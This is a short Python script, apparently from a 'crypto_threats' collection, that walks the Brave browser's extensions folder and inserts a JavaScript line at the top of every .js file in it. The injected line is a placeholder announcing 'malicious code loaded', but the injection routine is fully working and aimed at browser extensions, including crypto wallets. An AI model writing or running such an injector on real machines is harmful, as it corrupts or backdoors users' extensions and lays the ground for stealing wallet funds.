# File: crypto_threats/wallet_extension_injector.py
import os
from rich.console import Console
from rich.progress import track

console = Console()
EXT_DIR = os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Default/Extensions')
INJECT_CODE = 'console.log("[Injected] malicious code loaded");'

for root, dirs, files in os.walk(EXT_DIR):
    for f in files:
        if f.endswith('.js'):
            path = os.path.join(root, f)
            try:
                lines = open(path,'r',encoding='utf-8').readlines()
                lines.insert(0, INJECT_CODE+'\n')
                open(path,'w',encoding='utf-8').writelines(lines)
                console.log(f"[green]Injected into {path}[/green]")
            except Exception as e:
                console.log(f"[red]Failed to inject into {path}: {e}[/red]")

console.print("[bold]Injection complete.[/bold]")
